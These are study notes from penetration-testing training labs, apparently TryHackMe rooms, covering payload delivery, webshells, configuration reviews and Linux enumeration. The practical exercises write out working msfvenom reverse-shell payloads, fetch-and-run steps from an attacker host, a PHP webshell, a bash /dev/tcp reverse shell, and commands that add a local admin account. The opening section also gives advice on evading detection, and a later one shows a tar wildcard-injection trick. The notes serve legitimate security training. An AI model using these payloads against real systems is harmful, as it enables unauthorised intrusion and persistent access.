- **File integrity monitoring** flags new/modified files in web directories — filenames that blend in (`config.bak.php`) and placement in expected-upload locations reduce triggering
- **Network monitoring** can flag unusual outbound connections from web server processes even over HTTPS — the connection _pattern_ itself can look suspicious regardless of encryption
- **Log analysis** — command strings show up directly in GET parameters; POST reduces this exposure but won't eliminate the underlying access pattern from a determined analyst

**Operational best practices:**

- **File placement** — expected-upload directories, boring filenames, or embedding within existing legitimate files
- **Access patterns** — vary timing, avoid rapid-fire requests, use realistic user agents/referrer headers
- **Command selection** — start with basic recon (`whoami`, `id`, `ls`) before anything noisy like privesc attempts
- **Cleanup** — always plan webshell removal post-engagement; leaving backdoors in production is unacceptable even under authorised testing

> [!summary] Quick Recap — Webshells
> 
> - HTTP-based access blends with normal web traffic — the primary reason to reach for one over a direct reverse/bind shell
> - POST over GET reduces log exposure; an auth gate prevents other parties from reusing the shell
> - URL-encoding is mandatory when triggering a full reverse shell through a webshell — `curl -G --data-urlencode` handles this cleanly
> - `php-reverse-shell.php` (PentestMonkey, in `/usr/share/webshells/`) gives a direct session instead of one-request-per-command interaction
> - Cleanup after the engagement is a non-negotiable operational requirement, not optional hygiene

---

#### Practical Exercises — Linux

Target: SSH access (`shell`/`TryH4ckM3!`), webshell upload UI at `http://MACHINE_IP`. Netcat listener (`nc -lvnp 4444`) started fresh before each catching exercise.

**1. Stageless ELF reverse shell:**

```bash
# Attacker
msfvenom -p linux/x64/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o shell.elf
python3 -m http.server 8000

# Target
wget http://CONNECTION_IP:8000/shell.elf -O /tmp/shell.elf
chmod +x /tmp/shell.elf && /tmp/shell.elf
```

**2. Staged Linux reverse shell via `multi/handler`:**

```bash
# Attacker: generate + serve
msfvenom -p linux/x64/shell/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o staged_shell.elf
python3 -m http.server 8000

# Attacker: handler
sudo msfconsole
use multi/handler
set PAYLOAD linux/x64/shell/reverse_tcp
set LHOST CONNECTION_IP
set LPORT 4444
exploit -j

# Target
wget http://CONNECTION_IP:8000/staged_shell.elf -O /tmp/staged_shell.elf
chmod +x /tmp/staged_shell.elf && /tmp/staged_shell.elf
```

`Sending stage` in the Metasploit console confirms the staging handshake succeeded.

**3. PHP webshell:**

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Upload via `http://MACHINE_IP`, then test:

```
http://MACHINE_IP/uploads/shell.php?cmd=whoami
```

**4. Full reverse shell via the webshell:**

```bash
# Attacker: listener first
nc -lvnp 4444

# Trigger via curl (auto-handles URL-encoding)
curl -G "http://MACHINE_IP/uploads/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/CONNECTION_IP/4444 0>&1'"
```

---

#### Practical Exercises — Windows

Target: Windows Server 2019 + XAMPP, RDP access (`Administrator`/`TryH4ckM3!`).

**1. Stageless Windows EXE:**

```bash
# Attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe
python3 -m http.server 8000
nc -lvnp 4444
```

```powershell
# Target (PowerShell)
Invoke-WebRequest http://CONNECTION_IP:8000/shell.exe -OutFile C:\Users\Administrator\Desktop\shell.exe
C:\Users\Administrator\Desktop\shell.exe
```

**2. Staged Windows Meterpreter via `multi/handler`:**

```bash
# Attacker
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o meterpreter.exe
python3 -m http.server 8000

sudo msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST CONNECTION_IP
set LPORT 4444
exploit -j
```

```powershell
# Target
Invoke-WebRequest http://CONNECTION_IP:8000/meterpreter.exe -OutFile C:\Users\Administrator\Desktop\meterpreter.exe
C:\Users\Administrator\Desktop\meterpreter.exe
```

```
# Attacker: interact
sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
```

**3. Creating a local admin account via webshell:**

Upload the same minimal PHP webshell, then (spaces encoded as `%20`):

```
http://MACHINE_IP/uploads/shell.php?cmd=net%20user%20pentester%20Passw0rd!%20/add
http://MACHINE_IP/uploads/shell.php?cmd=net%20localgroup%20administrators%20pentester%20/add
```

**4. RDP in using the new account:**

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:pentester /p:'Passw0rd!'
```

> [!summary] Quick Recap — Practical Exercises
> 
> - Both platforms follow the identical arc: generate payload → serve via `python3 -m http.server` → fetch on target → execute → catch (netcat for stageless, `multi/handler` for staged)
> - Webshells extend past simple command execution into real persistence — the Windows exercise demonstrates a webshell being used to create a durable admin-level access path (new local admin account) rather than just running one-off commands
> - `curl -G --data-urlencode` is the reliable, low-friction way to fire complex shell payloads through a webshell without manual URL-encoding errors

---

> [!summary] Full Shell Payload Generation & Delivery Room — One Glance
> 
> - Manual payloads (named pipes, PowerShell one-liners, Python/bash socket tricks) cover scenarios where standard netcat `-e` isn't available
> - `msfvenom` automates generation across platforms/formats — stageless for netcat-compatible simplicity, staged for smaller footprint + `multi/handler` dependency, Meterpreter always needs `multi/handler`
> - `multi/handler` is mandatory for any staging protocol — payload/`LHOST`/`LPORT` must match generation exactly, or the connection fails silently
> - Webshells trade interactivity for stealth — HTTP-based access blends with normal traffic, and can be upgraded into a full reverse shell via URL-encoded payloads through the same command channel
> - The full practical arc — generate, serve, fetch, execute, catch — is identical across Linux and Windows; only the specific commands/binaries change
> - Encoding, obfuscation, and careful file placement reduce detection risk but don't eliminate it — operational discipline (cleanup, realistic access patterns, minimal noisy commands) matters as much as the technical payload itself
## 14. Privilege Escalation

### Host-Server Configuration Reviews

> [!info] Room context Conceptual foundation room — no hands-on exploitation, but the knowledge needed before approaching any host for privilege escalation. Covers what a configuration review is, the industry baselines (CIS Benchmarks, DISA STIGs) that define "secure," the automated tooling that audits against them at scale, the major misconfiguration categories that lead to privilege escalation, and a structured, OS-agnostic enumeration methodology. Later rooms in this module (Linux/Windows PrivEsc) apply these concepts hands-on.

**Two broad categories of privilege escalation:**

- **Vulnerability-based** — exploiting software bugs (kernel vulns, buffer overflows, known CVEs in running services)
- **Configuration-based** — exploiting _how the system was set up_: overly permissive file permissions, insecure service configs, plaintext credentials left accessible

> [!note] This room's focus Configuration-based escalation specifically. **A fully patched system with zero known software vulnerabilities can still be trivially escalated if its configuration is poor** — and in mature environments where patching is consistent but hardening isn't, configuration-based escalation is often _more_ common and reliable than vulnerability-based.

#### What Is a Configuration Review

**Definition:** a structured audit of a host's settings, permissions, services, and policies, measured against an accepted secure baseline — identifying deviations that introduce risk. In pentesting, those deviations are potential privilege escalation vectors.

**Configuration review vs. vulnerability scanning:** a vulnerability scanner (Nessus, Qualys) finds known software flaws, missing patches, CVEs — _what software is running and is it flawed_. A configuration review asks _how is the system set up_ — a host can pass a vulnerability scan with zero findings and still fail a configuration review because services run with excessive privileges, permissions are too broad, or credentials sit in accessible locations.

**Configuration review vs. exploit development:** exploitation asks "what is broken in this software?" Configuration review asks "what is set up incorrectly on this system?" Complementary skills, different mindset entirely.

**When it happens in an engagement:** typically **post-exploitation** — after initial access to a host, the configuration review is the systematic search for the misconfiguration that enables privilege escalation. Can also run as a standalone assessment (authenticated access, findings reported as hardening gaps rather than exploitable vulnerabilities) — same checks, different framing.

> [!note] The offensive/defensive duality Defensively, a configuration review is a compliance/hardening exercise aimed at remediation. Offensively, it's the _identical process_ aimed at exploitation instead. **The same checklist a sysadmin uses to harden a server is, in effect, an enumeration guide for an attacker.** Learning what secure configuration looks like simultaneously teaches what insecure configuration looks like and how to spot it.

**Scope of applicability:** any auditable system — workstations, file servers, domain controllers, web servers, database servers, network appliances, cloud instances. The specific checks vary by OS/role, but the _categories_ of misconfiguration are broadly consistent across platforms — a Linux web server and a Windows domain controller both have file permissions, service configs, user accounts, and credential storage to audit.

> [!summary] Quick Recap — What Configuration Review Is
> 
> - Configuration review = "how is this set up," vulnerability scanning = "what software flaws exist" — genuinely different questions, both needed for full coverage
> - Happens post-exploitation in most engagements, but can also run standalone as a compliance exercise
> - Offensive and defensive configuration review are the same process with opposite intent — remediation vs. exploitation
> - Misconfiguration categories are consistent across OS/platform even though specific checks differ

---

#### Security Baselines and Frameworks

**A security baseline** is a documented standard defining acceptable-security configuration for every configurable aspect of a system — password policies, file permissions, service configs, network settings — rather than relying on individual judgement about what "secure" means.

**CIS Benchmarks** — published by the Center for Internet Security, covering a wide range of OSes, cloud platforms, applications, network devices. Developed through a **consensus-driven process** across government/industry/academia. Each recommendation includes: description, rationale (the security risk addressed), audit procedure (how to check compliance), remediation procedure (how to fix a deviation).

**Two profile levels:**

- **Level 1** — practical, broadly applicable, minimal functionality impact — usable on most systems without careful testing
- **Level 2** — deeper defence-in-depth hardening, but may restrict functionality or need more careful rollout testing

Example: a Level 1 Ubuntu recommendation that `PermitRootLogin` in `sshd_config` must be `no` — rationale: direct root SSH login gives an attacker who obtains/brute-forces the root password immediate privileged access, bypassing per-user accountability entirely.

**DISA STIGs** — Security Technical Implementation Guides, published by the U.S. Defense Information Systems Agency. More prescriptive than CIS Benchmarks, **mandatory** for U.S. government/military network systems.

**Severity categorisation:**

|Category|Risk Level|
|---|---|
|CAT I|Highest — exploitation could directly cause loss of confidentiality/integrity/availability|
|CAT II|Medium|
|CAT III|Low|

This categorisation helps admins prioritise remediation, and equally helps a pentester prioritise which deviations to investigate first.

**Relationship to broader compliance standards:** PCI-DSS, ISO 27001, NIST 800-53 frequently reference CIS/STIG hardening as their own implementation guidance — an org proving PCI-DSS compliance often draws its actual hardening directly from a CIS Benchmark.

> [!note] Why these frameworks matter to a pentester specifically Two reasons: (1) they define what the target organisation itself considers "secure" — deviations from the org's own adopted baseline are the **most defensible findings** in a report, and (2) they provide a structured, comprehensive checklist far more reliable than ad-hoc enumeration driven by memory or intuition.

> [!summary] Quick Recap — Baselines and Frameworks
> 
> - CIS Benchmarks: consensus-built, Level 1 (broad/safe) vs. Level 2 (deeper/riskier) profiles, four-part structure (description/rationale/audit/remediation)
> - DISA STIGs: mandatory in US government/military, CAT I/II/III severity for prioritisation
> - Broader compliance frameworks (PCI-DSS, ISO 27001, NIST 800-53) often _reference_ CIS/STIG rather than defining their own hardening from scratch
> - A finding against the org's own adopted baseline is the strongest, most defensible kind of report finding

---

#### Automated Compliance Tooling

Manually auditing a full CIS Benchmark or STIG is impractical — hundreds of recommendations per benchmark, potentially thousands of hosts. Automated tools scan programmatically and flag deviations.

|Tool|Model|Notes|
|---|---|---|
|**Nessus** (Tenable)|Remote scanning|Best known for vuln scanning, but also does compliance auditing against CIS/STIG/custom policies. A shared Nessus compliance report on a grey/white-box engagement is effectively a **pre-built list of misconfigurations** — every failed check is a potential escalation vector worth investigating directly|
|**Lynis**|Runs locally on the audited host|Open-source, Linux/macOS/Unix. Produces a hardening index score + categorised findings/warnings/suggestions. Useful both defensively (admin self-audit) and offensively (post-shell enumeration) — **but running additional tools on a target carries detection risk and may violate rules of engagement**, weigh against scope|
|**OpenSCAP**|SCAP-standard evaluation|Evaluates against SCAP-formatted profiles (including CIS/STIG content), structured machine-readable output. Common in government/enterprise environments with regulatory compliance-validation requirements|
|**CIS-CAT**|CIS's own tool|Purpose-built for CIS Benchmark evaluation specifically — free Lite version + commercial Pro version. Most direct benchmark-to-report mapping available|

> [!warning] Lynis and similar tools on a live target — weigh the trade-off Genuinely useful for fast, comprehensive post-shell enumeration — but uploading/running additional software on a compromised host is itself a detection risk and needs to sit within the engagement's agreed scope and OPSEC requirements. Not a default action, a deliberate choice.

**Offensive-side counterparts:** **LinPEAS**, **WinPEAS**, **PowerUp** — designed to run on a compromised host and surface configuration weaknesses from an _attacker's_ perspective. Check many of the same underlying issues as compliance tools (writable files, weak service permissions, stored credentials) — the difference is output framing: exploitation-oriented, not remediation-oriented.

> [!note] Two sides of the same coin A CIS check verifying SSH root login is disabled and a LinPEAS check flagging the SSH config are checking the **same underlying condition** — just presented to different audiences with different intended actions. Understanding one gives direct insight into the other.

> [!summary] Quick Recap — Automated Tooling
> 
> - Nessus compliance reports (if available from the client) hand over a ready-made misconfiguration list — always worth requesting/checking for in grey/white-box work
> - Lynis runs locally and is genuinely useful post-shell, but carries real detection/scope risk to weigh before running it
> - LinPEAS/WinPEAS/PowerUp are the offensive mirror of compliance tools — same underlying checks, exploitation-framed output
> - Compliance tools and offensive enumeration tools check the same conditions; the framework knowledge from this room applies directly to interpreting either

---

#### Categories of Misconfiguration

Six recurring categories, consistent conceptually across OS/platform even though specific implementation details differ.

**1. User and Group Configuration** — least privilege violated when accounts hold more access than their function requires. Common issues: unnecessary admin group membership, over-privileged service accounts, undisabled default accounts, weak/absent password policies. **A compromised account already in an admin group may need zero further exploitation** — the misconfiguration _is_ the escalation.

**2. File and Directory Permissions:**

- **Linux** — the **SUID bit** (executable runs with the _file owner's_ privileges, not the executing user's) on a root-owned binary with exploitable functionality (arbitrary command/file execution) is a direct escalation vector. Also: world-writable scripts/binaries executed by privileged processes, overly broad read permissions on sensitive files (`/etc/shadow`, SSH private keys)
- **Windows** — excessive ACL permissions: writable directories in the system `PATH`, weak install-directory defaults, misconfigured registry key ACLs on service-related keys

**3. Service Configurations** — secure baseline: minimum necessary privilege, restrictive access control against unauthorised modification, full unambiguous executable paths.

Common issues: services running as root/`LocalSystem` unnecessarily, writable service configs/binaries, and — the classic Windows finding — **unquoted service paths**.

> [!warning] The unquoted service path mechanism, precisely A service path like `C:\Program Files\My App\service.exe`, if unquoted, gets resolved by the Service Control Manager testing each possible space-delimited token boundary in order: `C:\Program.exe` → `C:\Program Files\My.exe` → `C:\Program Files\My App\service.exe`. **If a non-privileged user can write to any intermediate directory along that resolution path**, planting a malicious binary at one of the earlier-tested paths gets it executed with the service account's privileges — before the real, intended executable is ever reached.

**4. Scheduled Tasks and Cron Jobs** — Linux: `cron` + crontab files; Windows: Task Scheduler. Baseline requirement: any script/binary a privileged scheduled task executes must itself be permission-protected, and the task configuration itself must not be modifiable by unauthorised users.

> [!warning] Wildcard injection — a specific, well-known cron pattern A root cron job running `tar cf /backup/archive.tar *` inside a directory can be hijacked if an attacker can create files there. Files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` get interpreted by `tar` as **command-line flags**, not filenames, when the wildcard expands — causing `tar` to execute the attacker's script with the cron job's (root) privileges. The vulnerability lives in how the wildcard expansion interacts with the utility's own flag-parsing, not in cron itself.

**5. Credential Storage** — an _operational hygiene_ issue, not strictly a permission misconfiguration.

- **Linux:** `~/.bash_history`, environment variables, app config files with DB connection strings/API keys, overly-readable SSH private keys
- **Windows:** Windows Credential Manager (`cmdkey /list`), `runas /savecred` saved credentials, cleartext registry passwords, deployment files (`Unattend.xml`, Sysprep configs), PowerShell command history, `web.config` files

**An attacker discovering stored privileged credentials escalates directly — no technical misconfiguration exploitation needed at all.**

**6. Network Configuration** — included for completeness, **not** a primary local-escalation vector, more relevant to lateral movement/attack surface. Example: MySQL bound to `0.0.0.0` instead of `127.0.0.1` becomes network-reachable rather than localhost-only — combined with weak/no auth, a path to data access or command execution via features like `INTO OUTFILE`/`COPY TO PROGRAM`. Other issues: unnecessary open ports, overly permissive firewall rules on management interfaces, cleartext-credential remote management protocols.

> [!summary] Quick Recap — Misconfiguration Categories
> 
> - Six categories: users/groups, file/directory permissions, service configs, scheduled tasks/cron, credential storage, network configuration
> - SUID (Linux) and unquoted service paths (Windows) are the two most iconic file/service-permission escalation patterns in each OS
> - Wildcard injection against cron jobs is a specific, well-documented pattern worth recognising by name, not just "cron misconfiguration" generically
> - Credential storage findings are often the most _direct_ escalation path — no technical exploitation needed once credentials are found
> - Network configuration is the one category more about attack surface/lateral movement than direct local privesc

---

#### Structured Enumeration Methodology

**Why structure matters:** relying on memory/intuition under time pressure reliably misses entire categories. A structured methodology maps every step to a defined misconfiguration category for comprehensive coverage.

**Phase 1 — Situational Awareness.** Before checking anything specific, establish context:

- Current user identity, privileges, group memberships
- OS, version, architecture
- Hostname and the host's role (workstation, web server, DB server, domain controller)
- Domain-joined status — affects which escalation paths even exist

> [!note] Why this phase comes first A domain-joined Windows server running IIS and a standalone Linux workstation present entirely different opportunity sets. Establishing context up front prevents wasted effort chasing checks that don't apply to this specific host.

**Phase 2 — Category-Based Enumeration** (consistent sequence, order not strictly fixed):

1. **User/group configuration** — all accounts + group memberships, admin/root-level accounts identified, default-account status checked, password policy reviewed where accessible
2. **File/directory permissions** — Linux: SUID/SGID binaries, world-writable files/dirs, broadly-readable sensitive files. Windows: ACLs on `PATH` directories, install directories, service-related registry keys
3. **Service configurations** — all running services + their run-as accounts, writability of binaries/configs by the current user, Windows-specific: unquoted paths and service security descriptors
4. **Scheduled tasks/cron jobs** — all scheduled jobs, flagging elevated-privilege ones specifically, permission-checking any referenced scripts/binaries. Linux: system-wide + per-user crontabs. Windows: Task Scheduler
5. **Credential storage** — shell history, environment variables, config files, registry entries, credential stores, deployment files — **often the highest-yield step**
6. **Network configuration** — listening ports, bound interfaces, firewall rules — contributes to overall posture understanding, more lateral-movement-relevant than direct escalation

**Phase 3 — Prioritisation and Exploitation.** Not every finding carries equal weight — prioritise by directness of escalation path and reliability toward the highest achievable privilege level. Stored root/admin credentials beat a writable file referenced by an hourly cron job — both valid, but the credential path needs no waiting or additional steps.

> [!note] Cross-category chaining is a core skill, not an edge case A root cron job running `/opt/scripts/backup.sh` every five minutes (scheduled-task finding) means little alone. That same script being world-writable (file-permission finding) also means little alone — a world-writable file nothing privileged ever touches is low priority. **Combined:** modify the script, wait for the cron job to run it as root, gain elevated access. Neither finding alone is the vulnerability — the _combination across categories_ is. Recognising these chains is what separates a checklist run-through from real privilege escalation methodology.

**The role of automated tools within this methodology:** LinPEAS/WinPEAS/PowerUp map directly onto this same structure and severity-flag their findings — but they're a **supplement, not a replacement.** Understanding _why_ a check matters (from the categories above) is what lets a tester correctly interpret tool output, spot false positives, and recognise gaps needing manual investigation the tool didn't cover. If compliance scan output (Nessus/Lynis) is available, its failed checks directly prioritise which category to investigate first — a failed service-permissions CIS check points straight at Phase 2's service configuration step.

> [!summary] Quick Recap — Enumeration Methodology
> 
> - Phase 1 (situational awareness) always precedes category enumeration — context determines which categories are even relevant
> - Six-category enumeration order is consistent, not strictly fixed — the point is coverage, not a rigid sequence
> - Prioritise by directness: stored credentials for a privileged account beat any finding requiring further steps or waiting
> - Cross-category chaining (a writable script + a privileged scheduled task referencing it) is often where the _actual_ escalation path lives — individually weak findings can combine into a strong one
> - Automated tools accelerate this methodology but don't replace understanding _why_ each check matters — that understanding is what catches false positives and gaps

---

#### Reading a CIS Benchmark

**Standard recommendation structure, every entry:**

- **Title** — the specific setting, phrased declaratively (e.g. "Ensure permissions on `/etc/shadow` are configured")
- **Profile applicability** — Level 1 or Level 2
- **Description** — the plain-terms requirement (e.g. `/etc/shadow` owned by root, group `shadow`, permissions limiting read/write to root and read to the `shadow` group)
- **Rationale** — the actual security risk addressed (`/etc/shadow` holds password hashes for every local account — readable by non-privileged users means extractable hashes for offline cracking)
- **Audit** — the specific command/procedure to check compliance (e.g. `stat /etc/shadow`, verify expected ownership/permissions)
- **Remediation** — the specific fix (e.g. `chown`/`chmod` commands to correct)

**Reading the same recommendation offensively:** not "is this compliant?" but **"if it's not compliant, what can I actually do with the finding?"** For `/etc/shadow`: readable by the current user → copy it → extract hashes → offline crack with John/Hashcat → a cracked root/admin hash is direct privilege escalation.

> [!note] Not every failed check is directly actionable Some failed benchmark checks represent pure defence-in-depth — not exploitable in isolation. The real skill is distinguishing three categories of finding: **directly actionable** (readable `/etc/shadow`), **chain-contributing** (only matters combined with another finding), and **low-priority informational** (real gap, but no realistic exploitation path on its own).

**Mapping tool output back to benchmark structure:** a Nessus finding like `7.1.5 - Ensure permissions on /etc/shadow are configured - FAILED` is reporting the exact same audit procedure defined in the CIS Ubuntu Benchmark. A LinPEAS flag on a world-readable `/etc/shadow` is detecting the identical underlying condition, offensively framed. **Understanding the benchmark recommendation behind a tool's finding gives far more confident severity/exploitability assessment than trusting the tool's output in isolation.**

> [!summary] Quick Recap — Reading CIS Benchmarks
> 
> - Six-part structure: title, profile level, description, rationale, audit, remediation — learn to scan for rationale + audit first, since those two answer "why does this matter" and "how do I check it" fastest
> - Offensive reading reframes "is this compliant" into "what can I do with this if it's not"
> - Three finding classes: directly actionable, chain-contributing, low-priority informational — sorting findings into these matters more than just collecting them
> - Tool output (Nessus/LinPEAS/etc.) traces back to specific benchmark recommendations — understanding the underlying recommendation gives better judgement than trusting a raw tool flag alone

---

> [!summary] Full Host-Server Configuration Reviews Room — One Glance
> 
> - Configuration-based escalation exploits _setup_, not software bugs — often more reliable than vulnerability-based escalation in well-patched-but-poorly-hardened environments
> - CIS Benchmarks (consensus-built, Level 1/2) and DISA STIGs (mandatory in US govt, CAT I/II/III) define what "secure" actually means — deviations from the org's own adopted baseline are the strongest report findings
> - Automated tooling splits into defensive/compliance-framed (Nessus, Lynis, OpenSCAP, CIS-CAT) and offensive/exploitation-framed (LinPEAS, WinPEAS, PowerUp) — both check the same underlying conditions
> - Six misconfiguration categories: users/groups, file/directory permissions, service configs, scheduled tasks/cron, credential storage, network config — consistent conceptually across every OS
> - Three-phase methodology: situational awareness → category-based enumeration → prioritisation (favouring directness, and watching for cross-category chains)
> - Reading a benchmark recommendation offensively means asking "what can I do with this failure," not just "is this compliant" — and sorting findings into directly-actionable / chain-contributing / informational
### Linux Privilege Escalation: Enumeration

> [!info] Room context No silver bullets in privilege escalation — everything depends on the specific target configuration (kernel version, installed apps, supported languages, other users' passwords). This room is the **enumeration** foundation: manual commands/techniques for OS info, users, network, and file system enumeration — the raw material every subsequent escalation technique depends on. Each task is self-contained but designed to be worked through in order.

**Privilege escalation, precisely defined:** exploiting a vulnerability, design flaw, or configuration oversight to gain unauthorized access to resources normally restricted — usually low-privilege account → high-privilege account.

**Why it matters:** real-world footholds almost never land with direct admin access — initial access is nearly always a low-privileged user. Escalating unlocks: resetting passwords, bypassing access controls to reach protected data, editing software configs, enabling persistence, changing user privileges, executing any administrative command.

#### What Is Enumeration

**The single most critical phase of Linux privilege escalation.** Before exploiting anything, understanding the environment — what's running, who's running it, what's misconfigured — is the entire prerequisite. Kernel version, installed applications, user permissions, scheduled tasks, network configuration: gathering all of this builds the picture of potential attack vectors. **Without thorough enumeration, exploitation attempts are guesswork.** The depth of understanding of the target directly determines how efficiently weaknesses get found and exploited.

---

#### OS Enumeration

**`hostname`** — returns the target's hostname. Often meaningless (`Ubuntu-3487340239`) but sometimes reveals the host's role in the corporate network (`SQL-PROD-01`).

**`uname -a`** — system info including kernel version, useful for cross-referencing known kernel vulnerabilities:

```bash
uname -a
# Linux home 6.8.0-41-generic
```

`Linux` (OS) / `home` (hostname) / `6.8.0-41-generic` (kernel version).

**`/proc/version`** — the procfs filesystem, present across most Linux flavours, exposes kernel build details:

```bash
cat /proc/version
# Linux version 6.8.0-41-generic (buildd@lcy02-amd64-077) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0, GNU ld ... 2.42)
```

Reveals: kernel version, build machine, compiler used, compiler's own package version, and the linker used during the kernel build.

**`/etc/issue`** — often holds OS identification, but easily customised/changed like any such file:

```bash
cat /etc/issue
# Ubuntu 22.04.1 LTS \n \l
```

> [!note] Cross-reference multiple sources Since any system-info file can be edited, checking `hostname`, `uname`, `/proc/version`, and `/etc/issue` together gives a more reliable picture than trusting any single source alone.

**`ps`** — running process enumeration. Output columns: **PID** (process ID), **TTY** (terminal type), **Time** (CPU time used, **not** runtime duration), **CMD** (command/executable — no command-line parameters shown).

Useful flag combinations:

- **`ps aux`** — `a` = all users' processes, `u` = show launching user, `x` = include processes with no controlling terminal
- **`ps axjf`** — `a`+`x` as above, `j` = jobs-format output, `f` = forest/tree view showing process parent-child relationships

```bash
ps axjf
```

```
   1  1039  1039  1039 ?           -1 Ss       0   0:00 /usr/sbin/sshd -D
1039  1854  1854  1854 ?           -1 Ss       0   0:00  \_ sshd: karen [priv]
1854  1890  1854  1854 ?           -1 S     1001   0:00      \_ sshd: karen@pts/0
```

The tree view directly shows SSH connection → shell spawn ancestry — useful for understanding what actually launched a given process.

**Cron** — Linux's time-based job scheduler. Worth checking specifically because cron jobs often run as **privileged users** — if a privileged cron job executes a script that's modifiable, it's a direct escalation vector (explored in a later room, but always part of the enumeration checklist here).

Check `/etc/crontab`, `/var/spool/cron/`, `/etc/cron.d/` for what's scheduled and **who it runs as**:

```bash
cat /etc/crontab
# 30 2 * * 1 root /home/ubuntu/clear-mail.sh
```

Field breakdown: minute (0-59) / hour (0-23) / day-of-month (1-31) / month (1-12) / day-of-week (0-7, both 0 and 7 = Sunday) / **user the task runs as** / the actual command. This example: `/home/ubuntu/clear-mail.sh` runs every Monday at 2:30 AM **as root**.

**`dpkg -l`** — lists all installed packages and versions. Directly useful for cross-referencing installed software against known-vulnerable-version exploit databases.

> [!summary] Quick Recap — OS Enumeration
> 
> - `uname -a`/`/proc/version` give the kernel version — the direct input to kernel exploit research
> - Cross-check `hostname`/`/etc/issue`/`uname`/`/proc/version` together — any single file can be customised/misleading alone
> - `ps axjf` shows process ancestry as a tree — useful for understanding what spawned what, not just what's running
> - Cron entries always list **who** they run as — a privileged cron job referencing a modifiable script is flagged right here, exploited later
> - `dpkg -l` is the starting point for matching installed software against known exploits

---

#### User Enumeration

**`id`** — privilege level and group memberships for the current user, or any specified user:

```bash
id
# uid=1001(john) gid=1001(john) groups=1001(john),100(users)
id matt
# uid=1002(matt) gid=1002(matt) groups=1002(matt),27(sudo),116(admin)
```

`matt`'s membership in the `sudo` group is immediately visible here — a direct privilege signal worth checking for every enumerated user, not just the current session's identity.

**`env`** — environment variables:

```bash
env
```

The `PATH` variable specifically is worth checking for a compiler or scripting language interpreter (Python, etc.) reachable in-path — potentially usable for code execution or as an escalation vector.

**`history`** — prior commands. Occasionally, though rarely, contains plaintext credentials typed by a previous session.

**`sudo -l`** — lists every command the current user is permitted to run via `sudo`. May prompt for the current user's password depending on configuration. **One of the single highest-value enumeration commands** — a misconfigured sudo rule is often a direct, immediate escalation path (explored further in the Basics room).

**`/etc/passwd`** — readable by any user, lists every account on the system:

```bash
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Extracting just usernames** (useful as a brute-force candidate list):

```bash
cat /etc/passwd | cut -d ":" -f 1
```

**Filtering to real (non-system/service) users** — real accounts almost always have a home directory:

```bash
cat /etc/passwd | grep /home
```

```
matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
karen:x:1001:1001::/home/karen:
```

> [!note] Why filtering matters The raw `/etc/passwd` username list is dominated by system/service accounts (`daemon`, `bin`, `sys`, `www-data`, etc.) that aren't useful brute-force or lateral-movement targets. Filtering by `/home` cuts straight to the accounts actually worth investigating further.

> [!summary] Quick Recap — User Enumeration
> 
> - `id <user>` on every discovered account reveals group membership (especially `sudo`/`admin`) directly, not just the current session
> - `sudo -l` is one of the highest-value single commands in this entire room — check it immediately
> - `/etc/passwd` is world-readable and lists every account — `grep /home` filters out system/service noise to find real user accounts fast
> - `env`'s `PATH` variable can reveal an in-reach compiler/interpreter worth remembering for later exploitation

---

#### Network Enumeration

**`ifconfig`** — network interface details. Beyond basic connectivity info, interface names themselves are informative — a `docker0` interface, for instance, directly signals Docker is running on the host, which shapes what escalation/pivoting techniques become relevant.

```bash
ifconfig
```

> [!note] `ifconfig` is legacy on modern distros Replaced by `ip addr` (the `ip` command) on modern Linux — `ifconfig` persists only if the `net-tools` package is installed. Know both.

**`netstat`** — connection and listening-port enumeration, several useful flag combinations:

|Command|Shows|
|---|---|
|`netstat -a`|All listening ports and established connections|
|`netstat -at` / `netstat -au`|TCP-only / UDP-only|
|`netstat -lt`|Listening TCP ports specifically|
|`netstat -s`|Network usage statistics by protocol|
|`netstat -tp`|Connections with service name + PID|
|`netstat -tpl`|Listening ports + PID/service name|
|`netstat -i`|Interface statistics|
|`netstat -ano`|All sockets, no name resolution, timers shown|

**The PID/Program name column requires ownership to populate** — a process owned by another user shows blank as a regular user, but reveals the full binary name/PID when run as root:

```bash
# As regular user — PID/Program column empty
netstat -tpln

# As root — reveals it directly
netstat -tpln
# tcp   0   0   0.0.0.0:389   0.0.0.0:*   LISTEN   1144/slapd
```

`netstat -ano` is the combination seen most often in write-ups: `-a` (all sockets) + `-n` (no name resolution) + `-o` (timers).

> [!note] `netstat` is also legacy Replaced by `ss` on modern distros — `ss -tpl` is the direct equivalent of `netstat -tpl`. `netstat` persists via the `net-tools` package. Know both commands, since target systems vary in what's actually installed.

> [!summary] Quick Recap — Network Enumeration
> 
> - Interface names themselves are informative (`docker0` = Docker running) beyond just IP/routing info
> - `netstat -tpln` as root reveals PID/program info hidden from a regular user's view of the same command — running enumeration commands both before and after any privilege gain is worth repeating
> - `netstat -ano` is the most commonly seen combination in practice: all sockets, numeric only, with timers
> - `ifconfig`/`netstat` are both legacy — `ip addr`/`ss` are the modern equivalents; know both since installed toolsets vary by target

---

#### File Enumeration

**`ls -la`** — always use `-la`, never bare `ls`/`ls -l`. Hidden files (dotfiles) are invisible without `-a`:

```bash
ls          # (nothing shown)
ls -l       # total 0
ls -la
# -rw-rw-r-- 1 karen karen 23 Feb 16 04:36 .secret.txt
```

A file completely invisible to `ls`/`ls -l` — the `-la` habit alone can be the difference between finding a credential file or missing it entirely.

**`find`** — the core file-hunting tool, worth knowing a wide range of invocations by heart:

**Basic search:**

```bash
find . -name flag1.txt              # current dir + subdirs, recursive
find /home -name flag1.txt          # scoped to /home
find / -type d -name config         # directory named "config"
find / -type f -perm 0777           # files world-rwx
